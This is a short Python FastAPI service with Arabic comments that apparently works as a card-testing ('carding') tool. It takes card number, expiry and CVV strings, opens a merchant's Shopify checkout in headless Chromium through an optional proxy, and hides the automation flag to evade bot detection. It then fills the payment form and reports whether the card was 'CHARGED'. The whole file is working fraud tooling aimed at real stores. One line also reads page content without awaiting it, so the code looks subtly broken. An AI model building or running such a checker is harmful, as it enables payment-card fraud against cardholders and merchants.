from fastapi import FastAPI, Query
from playwright.async_api import async_playwright
import uvicorn
import asyncio

app = FastAPI()

@app.get("/check")
async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
    async with async_playwright() as p:
        # إقلاع المتصفح (Headless هو الوضع الافتراضي لـ Railway)
        browser = await p.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
        
        context_args = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 720}
        }
        if proxy:
            context_args["proxy"] = {"server": proxy}
            
        context = await browser.new_context(**context_args)
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        page = await context.new_page()
        
        try:
            # 1. التعديل الأهم: استخدام networkidle للانتظار حتى اكتمال كل تحميلات الـ JS
            # زيادة الوقت لـ 60 ثانية لضمان استقرار تحميل Shopify
            await page.goto(f"{site}/checkout", timeout=60000, wait_until="networkidle")
            
            # 2. انتظار إضافي: التأكد من أن الـ iframe أصبح موجوداً في الصفحة قبل محاولة استخدامه
            try:
                await page.wait_for_selector('iframe[title="Secure card payment input frame"]', timeout=20000)
            except:
                return {"Gateway": "Shopify Payments", "Response": "TIMEOUT_IFRAME_NOT_FOUND", "Status": "false", "CC": cc}

            frame = page.frame_locator('iframe[title="Secure card payment input frame"]')
            
            # محاولة تعبئة الحقول
            await frame.locator('input[name="number"]').fill(cc.split('|')[0])
            await frame.locator('input[name="expiry"]').fill(f"{cc.split('|')[1]}/{cc.split('|')[2]}")
            await frame.locator('input[name="verification_value"]').fill(cc.split('|')[3])
            
            await page.locator('button#continue-button').click()
            
            # انتظار انتهاء عملية الدفع
            await page.wait_for_load_state("networkidle", timeout=15000)
            
            content = page.content().lower()
            status = "true" if "thank-you" in page.url or "success" in content else "false"
            
            await browser.close()
            return {"Gateway": "Shopify Payments", "Response": "CHARGED" if status == "true" else "CARD_DECLINED", "Status": status, "CC": cc}
            
        except Exception as e:
            await browser.close()
            return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": str(e), "Status": "false", "CC": cc}
